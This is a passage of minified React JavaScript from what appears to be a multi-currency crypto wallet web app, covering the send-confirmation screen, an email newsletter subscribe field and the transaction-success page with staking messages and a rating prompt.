                        amount: ne || "",
                        multisigType: i.walletType,
                        walletFrom: i.uuid,
                        currency: i.currency
                    };
                    i.walletType === we._h.ETHEREUM && Object.assign(p, {
                        hash: d.transactionData
                    });
                    const E = new URLSearchParams(p)
                      , h = s.pathname.replace("/confirm", "")
                      , g = cc.$.txPerformanceEnd(e);
                    cc.$.send(cc.d.PERFORMANCE_TX_SEND_MULTISIG, T.currency, `${g} ms`);
                    l.replace({
                        pathname: `${h}/success`,
                        search: E.toString()
                    });
                    cc.$.send(cc.d.MULTISIG_CREATE, T.currency);
                    await o(fetchMultisigTransactions())
                } catch (e) {
                    f(!1);
                    "AdapterError" === e.name ? y({
                        code: e.errorCode
                    }) : y("Failed create tx");
                    throw e
                }
            }
            ), [o, Q, T, l, s.pathname, r.amount, r.feePerByte, r.gasLimit, r.gasPrice, C, c])
              , me = (0,
            O.useCallback)((async e => {
                var t, a, n;
                if (!T || !C || !V)
                    return;
                await setProcess(`Loading ${(0,
                be.xG)(T.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                await setProcess("Broadcasting transaction to network...");
                const s = await tM.send("send", T, C, V, {
                    amount: r.amount || "0",
                    amountInUsd: r.amountInUsd,
                    isFeeIncluded: ee === TM,
                    gasLimit: Number(null !== (t = r.gasLimit) && void 0 !== t ? t : "NaN"),
                    gasPrice: Number(null !== (a = r.gasPrice) && void 0 !== a ? a : "NaN"),
                    feePerByte: Number(null !== (n = r.feePerByte) && void 0 !== n ? n : "NaN"),
                    extraId: r.extraId,
                    nonce: r.nonce,
                    fee: Q || ""
                }, K);
                if (s.error) {
                    f(!1);
                    y(s.error)
                } else if (s.hash) {
                    if ("success" !== s.hash)
                        if ("fio" === T.currency) {
                            const e = s.pendingTx;
                            delete e.confirmations;
                            e.timestamp = Date.now();
                            await T.addTx(e)
                        } else
                            "nano" !== T.currency && o(transactions_addPendingTx(s.pendingTx));
                    let t = "";
                    s.extraData && s.extraData.txPrivKey && (t = s.extraData.txPrivKey);
                    s.encodedExtraData && "xmr" === T.currency && o(setTxKey(s.hash, s.encodedData));
                    const a = {
                        hash: s.hash || "",
                        walletFrom: T.uuid || "",
                        currency: T.currency || "",
                        extraHash: t || "",
                        amount: ne || ""
                    }
                      , n = cc.$.txPerformanceEnd(e);
                    cc.$.send(cc.d.PERFORMANCE_TX_SEND, T.currency, `${n} ms`);
                    const r = new URLSearchParams(a);
                    l.replace({
                        pathname: (0,
                        M.RU)("/send/success"),
                        search: r.toString()
                    })
                }
            }
            ), [ee, o, Q, V, T, l, r.amount, r.amountInUsd, r.extraId, r.feePerByte, r.gasLimit, r.gasPrice, r.nonce, C])
              , pe = (0,
            O.useCallback)((async () => {
                if (x) {
                    B(!0);
                    return
                }
                if (IM)
                    return;
                if (!Q && 0 !== Q)
                    return;
                if (ae)
                    return;
                if (!T)
                    return;
                if ((ie || oe) && !ce)
                    return;
                const e = cc.$.txPerformanceStart();
                IM = !0;
                f(!0);
                y(null);
                await setProcess("Updating wallet balance...");
                try {
                    await o(updateBalanceByWallet(T, !1))
                } catch (e) {
                    f(!1)
                }
                null != T && T.multisigId ? de(e) : me(e)
            }
            ), [o, Q, T, de, me, ae, x]);
            (0,
            O.useEffect)(( () => {
                D && pe()
            }
            ), [D, pe]);
            (0,
            O.useEffect)(( () => {
                if (c.length && !T) {
                    const e = u(r.walletFrom);
                    A(e);
                    r.addressTo && e ? N({
                        uuid: "send_confirm_dummy_to_wallet",
                        title: "",
                        address: r.addressTo,
                        currency: e.currency
                    }) : N(u(r.walletTo))
                }
            }
            ), [c, u, T, r.walletFrom, r.addressTo, r.walletTo]);
            (0,
            O.useEffect)(( () => {
                async function checkBalance() {
                    if (!T || !C)
                        return;
                    let e = null;
                    e = Se.Z.hasLightAdapterByWallet(T) ? await Se.Z.loadLightAdapterByWallet(T) : await Se.Z.getApiByWallet(T);
                    const {balance: t} = await e.getBalanceByAddress({
                        address: null == C ? void 0 : C.address
                    });
                    L(t)
                }
                if (C && ["dot", "near"].includes(null == C ? void 0 : C.currency)) {
                    L("0");
                    checkBalance()
                }
            }
            ), [T, C]);
            const fe = {
                fromWallet: T,
                balance: P
            }
              , Ee = undefined
              , he = new lf.Validator({
                stopAtFirstError: !0
            }).addField({
                rules: [...zf.dotMinimalBalance(fe), ...zf.nearMinimalBalance(fe)],
                value: (0,
                Ko.h9)(r.amount, Q)
            });
            (0,
            O.useEffect)(( () => {
                he.validate().isValid || b(AM)
            }
            ), [he, P]);
            (0,
            O.useEffect)(( () => {
                T && o(updateWalletsBalanceAndTxs(T, {
                    isCascade: !1
                }))
            }
            ), [o, T]);
            (0,
            O.useEffect)(( () => {
                setProcess(q ? "Loading Fee..." : null)
            }
            ), [q]);
            (0,
            O.useEffect)(( () => {
                if (g) {
                    IM = !1;
                    setProcess(null);
                    m(!1)
                }
            }
            ), [g]);
            (0,
            O.useEffect)(( () => {
                const e = new AbortController
                  , t = e.signal;
                (async () => {
                    var e;
                    const a = T ? await (null === (e = T.getAvailableBalance) || void 0 === e ? void 0 : e.call(T)) || T.balance : "0";
                    t.aborted || W(a)
                }
                )();
                return () => e.abort()
            }
            ), [T]);
            (0,
            O.useEffect)(( () => {
                E && !d && m(!0);
                if (!E) {
                    IM = !1;
                    m(!1)
                }
            }
            ), [d, E]);
            const handleUpdateBalance = e => async () => {
                setProcess("Updating wallet balance...");
                await o(updateWalletsBalanceAndTxs(e, {
                    isCascade: !0
                }));
                setProcess(null)
            }
              , handleBack = () => {
                l.replace({
                    pathname: (0,
                    M.RU)("/send"),
                    search: s.search
                })
            }
              , ye = undefined;
            if (!checkHashParams(r))
                return O.createElement("div", {
                    className: sM
                }, O.createElement(DashboardMenu, null), O.createElement("div", {
                    className: cM
                }, O.createElement("img", {
                    src: lM,
                    alt: ""
                }), O.createElement("p", null, "Transaction data does not match the information you have entered. Please go back to Step 1 and double-check the information."), O.createElement(Yl, {
                    onClick: handleBack,
                    color: "blue"
                }, "Go back to Step 1")));
            if (!T || !V)
                return O.createElement("div", {
                    className: sM
                }, O.createElement(DashboardMenu, null));
            const ve = T.hw || V.hw
              , _e = !r.resource && (0,
            Ko.gt)(r.amount, T.balance)
              , ke = !r.resource && !!(Q && te && (0,
            Ko.gt)(Q, V.balance))
              , Ce = !r.resource && Q && (0,
            Ko.gt)(Q, r.amount) && !te
              , Ne = (null != Q ? Q : 0) > 0 && !(!Q || te || !(0,
            Ko.G)((0,
            Ko.PD)(r.amount, Q), F)) && !(null != T && T.multisigId) && he.validate().isValid
              , setIsConfirmErrorFunction = () => {
                z(!0);
                setTimeout(( () => z(!1)), 1e3)
            }
              , handleConfirmButton = () => _e || ke || ae || Y || ue ? setIsConfirmErrorFunction() : pe()
              , Te = k(r.amount, T)
              , Ae = k(null != Q ? Q : void 0, V)
              , xe = (0,
            be.II)((null == T ? void 0 : T.family) || T.currency) || {}
              , updateFeeStatus = () => {
                const e = ee === AM ? TM : AM;
                b(e);
                o(setCacheKey("feeStatus", e))
            }
            ;
            function handleUnlockForm(e, t) {
                I(e);
                B(!1);
                t && G(!0)
            }
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(LockPasswordLabel, {
                params: r,
                back: "/app/send/confirm",
                showLockPasswordLabel: R,
                onChangeStatus: handleUnlockForm
            }), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: Ht()(iM, {
                    [oM]: x && R
                })
            }, O.createElement(_m, {
                wallet: T,
                type: zd
            }), O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Send", " ", (0,
            Ko.yF)(r.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(T.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will send", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, O.createElement("span", {
                className: bM
            }, (0,
            Ko.yF)(r.amount)), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(T.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement("span", {
                className: bM
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: Te
            })), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(r.toConvert || S))))), O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: T
            }), C && !r.walletTo && !r.addressToTitle && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "To address"), O.createElement(ConfirmInfoValue, null, C.address)), C && !r.walletTo && !!r.addressToTitle && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "To Wallet Alias", C && r.addressToTitle && O.createElement(ConfirmInfoSubTitle, null, "To address")), O.createElement(ConfirmInfoValue, null, r.addressToTitle, C && r.addressToTitle && O.createElement(ConfirmInfoSubValue, null, C.address))), C && r.walletTo && O.createElement(ConfirmInfoWallet, {
                type: "to",
                wallet: C
            }), r.extraId && xe.extraId && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, xe.extraId.title), O.createElement(ConfirmInfoValue, null, formatAddress(r.extraId, 8))), V.uuid !== T.uuid && O.createElement(O.Fragment, null, O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(V.currency)), " ", "Balance"), O.createElement(ConfirmInfoValue, null, O.createElement("span", {
                className: bM
            }, (0,
            Ko.yF)(V.balance)), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(V.currency)))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(T.currency)), " ", "Balance"), O.createElement(ConfirmInfoValue, null, O.createElement("span", {
                className: bM
            }, (0,
            Ko.yF)(T.balance)), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(T.currency))))), "eos" !== V.currency && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, null !== (t = (null == V ? void 0 : V.family) || (null == V ? void 0 : V.currency)) && void 0 !== t && t.startsWith("hbar") || "trx" === (null == T || null === (a = T.data) || void 0 === a ? void 0 : a.family) && "trx" !== (null == T || null === (n = T.data) || void 0 === n ? void 0 : n.currency) ? "Estimated Network fee" : "Network fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, Ne && O.createElement("a", {
                href: "#",
                onClick: updateFeeStatus
            }, ee === TM ? "Included" : "Excluded"), " ", O.createElement("span", {
                className: bM
            }, null === Q || q ? "–" : O.createElement("span", null, Q, " ", O.createElement("span", {
                className: "nowrap"
            }, r.resource && (0,
            be.iX)(r.resource) || (0,
            be.xG)(V.currency)))), O.createElement(ConfirmInfoSubValue, null, null !== Q ? O.createElement("span", {
                className: bM
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: Ae,
                resource: r.resource
            })) : "–", " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(r.toConvert || S))))), "eos" === V.currency && !v && O.createElement("div", {
                className: gM,
                onClick: () => _(!0)
            }, "Fee info", O.createElement("img", {
                src: VT,
                alt: ""
            })), v && O.createElement(ui_message, null, "Technically there is no transaction fee on", " ", O.createElement("b", null, "EOS"), ". However some CPU and Net resources will be spent."), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will receive"), O.createElement(ConfirmInfoValue, null, O.createElement("span", {
                className: bM
            }, (0,
            Ko.yF)(ne)), " ", O.createElement("span", {
                id: "sendTicker",
                className: "nowrap"
            }, (0,
            be.xG)(T.currency)))), r.feePerByte && "1" === r.feePerByte && O.createElement(ui_message, {
                type: "warning"
            }, "You are sending a transaction with a minimal fee. It can take a long time to confirm."), O.createElement("div", {
                className: dM
            }), O.createElement("div", {
                className: Ht()({
                    [mM]: H
                })
            }, _e && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient", " ", (0,
            be.xG)(T.currency), " ", "Balance. Available balance:", " ", T.balance, " ", (0,
            be.xG)(T.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(T)
            }, "Update wallet balance")), ie && !ce && O.createElement(ui_message, {
                type: "error"
            }, "ADA network rules: send all or leave at least 1 ADA on balance."), oe && O.createElement(ui_message, {
                type: "error"
            }, "ADA network rules: send at least 1 ADA. Exclude the fee or increase the amount."), ke && O.createElement(nM, {
                wallet: V
            }), ae && O.createElement(ui_message, {
                type: "error"
            }, "The transaction fee exceeds the amount you will receive – please exclude the fee or choose a bigger sum to send."), !ae && Ce && O.createElement(ui_message, null, "Please note that the fee for this transaction is greater than the receiving amount."), O.createElement(ledger_token_info, {
                parentWallet: V
            }), d && ve && O.createElement(ui_message, null, "Please unlock you", " ", T.hw, ", choose", " ", (0,
            be.xG)(T.family), " ", "app and then press Confirm."), Y && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: vM,
                onClick: X
            }, "try again")), ue && O.createElement(ui_message, {
                type: "error"
            }, "Transaction results in an account with insufficient funds for rent. ", " ", O.createElement("a", {
                href: "https://solana.com/fi/docs/core/rent",
                target: "_blank",
                rel: "noreferrer noopener"
            }, "Check out how rent works (What is rent? | Solana ) ", O.createElement(VA, {
                src: uD,
                alt: "Open Link"
            }))), g && O.createElement(bf, {
                error: g
            }), p && "trx" === T.currency && O.createElement(ui_message, {
                type: "warning"
            }, "Please wait until the end of the operation. This may take a couple of minutes.")), O.createElement("div", {
                className: fM
            }, d && O.createElement("div", {
                className: yM
            }, E && O.createElement("span", null, E)), !d && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !d && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirmButton,
                isLoading: d
            }, "Confirm")))), O.createElement("input", {
                id: "sendAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: r.amountInUsd
            }))
        }
          , PM = BoardSendConfirm
          , random = (e, t) => Math.floor(Math.random() * (t - e + 1)) + e
          , LM = a.p + "1318fc6e7abada5a64576be9d3bd6c57.svg"
          , FM = a.p + "0d643c6c9b9fa37665b1fa2246becd49.svg"
          , WM = a.p + "cce92032193cbac0d91646b15c947fcf.svg"
          , RM = a.p + "1a749c1503d42c757f8cdacc1af84cb0.svg"
          , BM = a.p + "cb24ec8e25001aa62c783dd3d794f423.svg"
          , OM = {
            wrapper: "input-subscribe_wrapper_1dhjt",
            input: "input-subscribe_input_3Cx5j",
            button: "input-subscribe_button_2H8JC",
            default: "input-subscribe_default_23OyB",
            success: "input-subscribe_success_155ya",
            error: "input-subscribe_error_24WZI",
            invalid: "input-subscribe_invalid_2gcuF",
            hidden: "input-subscribe_hidden_d4bAb",
            information: "input-subscribe_information_ovvb7"
        }
          , DM = a.p + "cda06535371b37f223a8e99dded8eba7.svg"
          , InputSubscribe = e => {
            let t = null;
            const a = O.createRef()
              , [n,r] = (0,
            O.useState)("default")
              , [l,s] = (0,
            O.useState)("");
            (0,
            O.useEffect)(( () => () => {
                clearTimeout(t)
            }
            ), []);
            const handleChange = e => {
                let {target: {value: t}} = e;
                s(t);
                r("default")
            }
              , subscribeByEmail = async () => {
                try {
                    return await Jf().get(`/api/v1/internal/subscriber?email=${l}&label=${e.label}`)
                } catch (e) {
                    return {
                        status: "error"
                    }
                }
            }
              , handleClick = async () => {
                const {isValid: n} = a.current.validate();
                if (!n) {
                    r("invalid");
                    return
                }
                const {onSubscribe: l} = e
                  , i = await subscribeByEmail();
                if (i && "error" !== i.status) {
                    r("success");
                    t = setTimeout(l, 2e3)
                } else
                    r("error");
                t = setTimeout(( () => {
                    r("default");
                    s("")
                }
                ), 3e3)
            }
            ;
            return O.createElement(sf(), {
                ref: a
            }, O.createElement(lf.ValidatorField, {
                value: l,
                rules: zf.email
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement("div", {
                    className: Ht()(OM.wrapper, OM[n])
                }, O.createElement(Ea, {
                    type: "text",
                    placeholder: "Your email",
                    className: OM.input,
                    onEnter: handleClick,
                    onChange: handleChange,
                    value: l
                }), O.createElement("button", {
                    type: "button",
                    className: OM.button,
                    onClick: handleClick,
                    id: "sparkSubscribe"
                }, O.createElement("img", {
                    src: DM,
                    alt: "Send"
                })), O.createElement("div", {
                    className: OM.information
                }, t || "invalid" !== n ? null : O.createElement("span", {
                    className: OM.invalid
                }, a), "error" === n ? "Subscribe error. Try again" : null, "success" === n ? "Thank you! You're subscribed." : null))
            }
            )))
        }
        ;
        InputSubscribe.propTypes = {
            label: as().string,
            onSubscribe: as().func
        };
        const MM = InputSubscribe
          , UM = "status_wrapper_1BktY app_wrapperBlock_2EpA3"
          , GM = "status_wrapperForm_w6y6F app_wrapperCenterBlock_bcslh"
          , VM = "status_address_1x41X"
          , KM = "status_xrpAirdropInfo_fWFiT"
          , HM = "status_repeatButton_33V3f"
          , zM = "status_subscribe_2GChu"
          , jM = "status_additionalButton_3Q04w"
          , $M = "status_wrapperCenter_2D28y"
          , ZM = "status_hash_35LaT"
          , YM = "status_textAlign_8f1dO"
          , qM = "status_hashText_1BWiT"
          , XM = "status_transactionAmount_22XtU"
          , QM = "status_minHeight_3XWtU"
          , JM = "status_xmrSend_2N4bz"
          , eU = "status_rightIcons_1LKfs"
          , tU = "status_rightIconsLink_1YRii"
          , aU = "status_buttonCopy_1EnnP styles_dashedNormal_xEvl8"
          , nU = "status_buttonCopyAddress_I0YSj styles_dashedNormal_xEvl8"
          , rU = "status_separatorS_1t4ip"
          , lU = "status_separatorXS_HEjsp"
          , sU = "status_description_1QyVa"
          , iU = "status_star_98bXJ"
          , oU = "status_starTitle_2GN1V"
          , cU = "status_iconCurrency_28D2p"
          , uU = "status_mobileExchange_RLPV3"
          , dU = "status_mobileArrowBlock_1FsIo"
          , mU = "status_exchangeBlock_1W36w"
          , pU = "status_exchangeText_AsBPx"
          , fU = "status_exchangeBlockMobile_3vAT8"
          , EU = "status_mobile_2AG0X"
          , hU = "status_txKeyBlock_3U73c"
          , gU = "status_tokenInfoBlock_3eMtj"
          , yU = "status_userSelect_2ezPC"
          , vU = "status_iconSuccess_2SeeS"
          , _U = "status_truncate_1FqPl"
          , getHrefRateGuarda = () => {
            const e = undefined
              , t = undefined;
            return ["https://www.cryptocompare.com/wallets/guarda-wallet/", "https://www.trustpilot.com/evaluate/guarda.co?"][1 === random(1, 5) ? 0 : 1]
        }
        ;
        function BoardSendSuccess() {
            const {convertToFiat: e} = useConverter()
              , t = (0,
            $.v9)(eu)
              , a = useLocationSearch()
              , n = t(a.walletFrom)
              , r = t(a.walletFrom)
              , l = t(a.walletTo)
              , s = (0,
            j.k6)()
              , [i,o] = (0,
            O.useState)(0)
              , c = a.amount
              , u = e(c, n)
              , {invoiceId: d} = a
              , m = "success" !== a.hash && a.hash ? a.hash : null
              , p = a.hashs && Object.values(a.hashs) || [m]
              , f = "adaStake" === a.type
              , E = "adaClaimTx" === a.type
              , h = "atomStaking" === a.type
              , g = "atomUnstaking" === a.type
              , y = "atomClaimTx" === a.type
              , v = "bnbTokensFreeze" === a.type
              , _ = "bnbTokensUnfreeze" === a.type
              , w = "cloStakingTx" === a.type
              , b = "eosStakingTx" === a.type
              , k = "eosUnstakingTx" === a.type
              , S = "ethStakeTx" === a.type
              , C = "oneStakeTx" === a.type
              , N = "oneUnstakeTx" === a.type
              , T = "oneClaimTx" === a.type
              , A = "ontStake" === a.type
              , x = "ontUnstake" === a.type
              , I = "ontClaimTx" === a.type
              , P = "trxStakingTx" === a.type
              , L = "trxUnstakingTx" === a.type
              , F = "trxClaimTx" === a.type
              , W = "trxWithdrawTx" === a.type
              , R = "trxDelegateTx" === a.type
              , B = "trxUndelegateTx" === a.type
              , D = "trxCancelUnstakeTx" === a.type
              , U = "xtzStakingTx" === a.type
              , G = "zilStakeTx" === a.type
              , V = "zilUnstakeTx" === a.type
              , K = "zilClaimTx" === a.type
              , H = "zilWithdrawTx" === a.type
              , z = "fioUpdate" === a.type
              , Z = "fioInvoiceApproved" === a.type
              , Y = "fioPaymentSuccess" === a.type
              , q = "multisig" === a.type
              , X = q && "script" === a.multisigType
              , Q = "udPaymentComplete" === a.type
              , J = "xrpAirdropTx" === a.type
              , ee = "xrpCloseAccountTx" === a.type
              , te = "bchSplitSuccess" === a.type
              , ae = "bchSplitCompleteSuccess" === a.type
              , ne = "bchSplitAlready" === a.type
              , re = "exchange" === a.type
              , mouseEnter = e => {
                let {target: t} = e;
                const a = null == t ? void 0 : t.dataset.number;
                o(a)
            }
              , mouseLeave = () => {
                o(0)
            }
              , mouseClick = e => {
                let {target: t} = e;
                const a = null == t ? void 0 : t.dataset.number;
                a && cc.$.send(cc.d.TRUSTPILOT_RAITING, a)
            }
              , getLink = e => {
                const t = n ? (0,
                be.Kb)(n.family, n.currency, e) : "";
                return N || C || T ? t.replace("/tx/", "/staking-tx/") : t
            }
            ;
            function goToFioInfo() {
                s.push({
                    pathname: (0,
                    M.RU)("/fio/manage")
                })
            }
            const getIconCurrency = e => O.createElement(IconCurrency, {
                currency: e,
                className: cU,
                isDisabled: !1,
                isHidden: !1
            })
              , repeatOperatinHandler = () => {
                if (!a.type || re) {
                    const e = re ? "/exchange" : "/send";
                    s.replace({
                        pathname: (0,
                        M.RU)(e),
                        search: objectToString({
                            walletFrom: a.walletFrom
                        })
                    })
                }
            }
              , getTitle = () => f ? "New staking will be applied from the next epoch" : E ? "The reward successfully claimed" : h ? "Stake successfully delegated" : g ? "Your deposit will be refunded after 21 days" : y ? "The reward successfully claimed" : v ? "Funds successfully frozen" : _ ? "Funds successfully unfrozen" : w || b ? "Stake successfully delegated" : k ? "Funds successfully unstaked. Your deposit will be refunded after 72 hours." : S ? "You will receive your reward in GETH every month." : C ? "Funds successfully staked" : N ? "Your funds will be refunded (on your balance) after 7 epochs (up to 7 days), or you can redelegate them after 1 epoch." : T ? "The reward successfully claimed" : A ? "New staking will start generating rewards in the next round." : x ? "The funds are blocked for up to 2 rounds. Follow the status in the Staking tab and redeem funds after unlocking." : I ? "The reward successfully claimed" : P ? "Your deposit will be refunded in 3 days" : L ? "Funds successfully unstaked" : F ? "The reward successfully claimed" : W ? "Funds successfully withdrawed" : D ? "Unstaking successfully cancelled" : R || B ? "Funds successfully delegated" : U ? "You will receive your first reward in roughly 39 days." : G ? "New staking will be applied from the next epoch." : V ? "The funds are blocked for ~ 14 days. Follow the status in the Staking tab and withdraw funds after unlocking." : K ? "Reward successfully claimed" : H ? "Funds successfully withdrawn" : z ? `Your FIO address ${a.accountName} has been updated` : Z ? "Request paid" : Y ? `Your address ${a.fioWalletName} is waiting for the Network confirmation` : q && X ? O.createElement(O.Fragment, null, " ", "Transaction signed. ", O.createElement("br", null), " Other participants will see it on the History tab. ", O.createElement("br", null), (null == n ? void 0 : n.minimumSigAmount) - 1, " more signatures required to confirm.") : q ? O.createElement(O.Fragment, null, "Signature broadcasted. ", O.createElement("br", null), " Other participants will see it on the History tab. ", O.createElement("br", null), (null == n ? void 0 : n.minimumSigAmount) - 1, " more signatures required to confirm.") : Q ? O.createElement(O.Fragment, null, "Your address ", a.domain, " is waiting for Network confirmation.", O.createElement("br", null), " Then you can use it to receive payments.") : J ? "Successfully claimed Spark tokens!" : ee ? "XRP account successfully closed" : te ? "Wait for the transaction to the BCH address (within 8 hours). After that, in the wallet Split section, click Complete to finish the split." : ae ? "Wait for the transaction to be confirmed (check the History tab). After that, the split will be completed, and you will be able to manage funds on BCH and ABC addresses separately." : ne ? "Your address is already split. You can safely send your ABC and BCHN funds." : d ? "Request was sent" : re ? "Exchange has been started. You can monitor the status on the History tab" : "Transaction was sent";
            return O.createElement("div", {
                className: UM
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: GM
            }, O.createElement("div", {
                className: $M
            }, O.createElement("img", {
                className: vU,
                src: LM,
                alt: ""
            }), O.createElement("h2", null, "Success!"), O.createElement("h3", null, getTitle()), !!c && !!n && O.createElement(O.Fragment, null, O.createElement("div", {
                key: c,
                className: Ht()(ZM, XM)
            }, O.createElement("div", {
                className: JM
            }, O.createElement("div", {
                className: yU
            }, (0,
            Ko.yF)(c), " ", (0,
            be.rX)(n.currency).toUpperCase()), O.createElement("span", {
                className: yU
            }, O.createElement(fiat_estimate_FiatEstimate, {
                value: u,
                renderCurrency: !0
            }))), a.extraHash && O.createElement("div", {
                className: hU
            }, "Tx Key: ", O.createElement("div", null, O.createElement("span", null, formatAddress(a.extraHash, 10))), O.createElement(button_copy, {
                text: a.extraHash,
                className: aU
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: FM,
                width: "20px",
                height: "20px",
                alt: ""
            })))), a.toAddress && O.createElement("div", {
                className: hU
            }, "To address: ", O.createElement("div", null, O.createElement("span", null, a.toAddress)), O.createElement(button_copy, {
                text: a.toAddress,
                className: aU
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: FM,
                width: "20px",
                height: "20px",
                alt: ""
            })))))), !!re && !!r && !!l && O.createElement("div", {
                key: c,
                className: Ht()(ZM, uU)
            }, O.createElement("div", {
                className: Ht()(mU, fU, {
                    [EU]: (0,
                    M.tq)()
                })
            }, O.createElement("div", {
                className: mU
            }, getIconCurrency(r.currency)), r.currency.toUpperCase()), O.createElement("div", {
                className: dU
            }, O.createElement("img", {
                src: BM,
                width: "8px",
                height: "6px",
                alt: ""
            }), O.createElement("div", {
                className: lU
            })), O.createElement("div", {
                className: Ht()(mU, fU, {
                    [EU]: (0,
                    M.tq)()
                })
            }, O.createElement("div", {
                className: mU
            }, getIconCurrency(l.currency)), l.currency.toUpperCase())), !d && p.map((e => e && O.createElement("div", {
                key: e,
                className: ZM
            }, re ? "Exchange ID" : "Hash", ": ", O.createElement("div", null, O.createElement("span", {
                className: qM
            }, formatAddress(e, 10))), re ? O.createElement("div", {
                className: eU
            }, O.createElement(button_copy, {
                text: e,
                className: aU
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: FM,
                width: "20px",
                height: "20px",
                alt: ""
            }))), O.createElement("a", {
                className: tU,
                href: `https://changenow.io/exchange/txs/${e}`,
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                src: Pg,
                alt: "",
                width: "17px",
                height: "17px"
            }))) : O.createElement("div", {
                className: eU
            }, O.createElement(button_copy, {
                text: getLink(e),
                className: aU
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: FM,
                width: "20px",
                height: "20px",
                alt: ""
            }))), O.createElement("a", {
                className: tU,
                href: getLink(e),
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                src: Pg,
                alt: "",
                width: "17px",
                height: "17px"
            })))))), !!d && O.createElement(O.Fragment, null, O.createElement("div", {
                key: d,
                className: ZM
            }, "Request ID: ", O.createElement("div", null, O.createElement("span", {
                className: qM
            }, formatAddress(d, 10))), O.createElement(button_copy, {
                text: d,
                className: aU
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: FM,
                width: "20px",
                height: "20px",
                alt: ""
            }))))), !!z && O.createElement("div", {
                className: ZM
            }, "Now, you can use this FIO address to receive payments."), !!Y && O.createElement(O.Fragment, null, O.createElement("div", null, O.createElement("div", {
                className: ZM
            }, "Follow the status and connect your wallets in FIO Address tab after confirmation"), O.createElement("div", {
                className: jM
            }, O.createElement(Yl, {
                onClick: goToFioInfo,
                color: "blue"
            }, "Check FIO status")))), !!J && O.createElement(O.Fragment, null, O.createElement("div", null, O.createElement("span", {
                className: KM
            }, "To receive Spark tokens, make sure you have funds on this XRP account on the date of snapshot, 12th of December. The date of distribution hasn’t been announced yet.")), O.createElement("div", {
                className: zM
            }, O.createElement(label, null, "Subscribe to our newsletter and find out about Spark distribution "), O.createElement(MM, {
                label: "xrp-airdrop"
            }))), ee && O.createElement("div", null, O.createElement("span", {
                className: KM
            }, a.amount, " XRP have been sent to ", a.addressTo, ".")), !Y && !J && O.createElement(O.Fragment, null, O.createElement("p", {
                className: oU
            }, "Would you like to rate us?"), O.createElement("a", {
                href: getHrefRateGuarda(),
                target: "_blank",
                rel: "noopener noreferrer"
            }, Array(5).fill().map(( (e, t) => i > t ? O.createElement("img", {
                key: t + 1,
                "data-number": t + 1,
                className: iU,
                src: RM,
                alt: "",
                onMouseEnter: mouseEnter,
                onMouseLeave: mouseLeave,
                onClick: mouseClick
            }) : O.createElement("img", {
                key: t + 1,
                "data-number": t + 1,
                className: iU,
                src: WM,
                alt: "",
                onMouseEnter: mouseEnter,
                onMouseLeave: mouseLeave,
                onClick: mouseClick
            }))))))), (!a.type || re) && O.createElement("div", {
                className: HM
            }, O.createElement(Yl, {
                color: "light-blue",
                radius: "large",
                onClick: repeatOperatinHandler
            }, re ? "Make new exchange" : "Send another transaction")))
        }
        const wU = "index_wrapper_1gy5j app_wrapperBlock_2EpA3"
          , bU = "index_wrapperForm_37o3d app_wrapperLeftBlock_3QLZp"
          , kU = "index_footerBlock_1hbff app_footerBlock_n86Kc"
          , SU = "index_stepInfo_3uPu_ app_stepInfo_2VLE6"
          , CU = "index_addTagLink_3UPyR"
          , NU = "index_toggleAdvancedOptions_3f5kZ"
          , TU = a.p + "1dcd2dad536458731837d2f19f6358ef.svg"
          , use_use_initial_params = () => {
            const e = useLocationSearch()
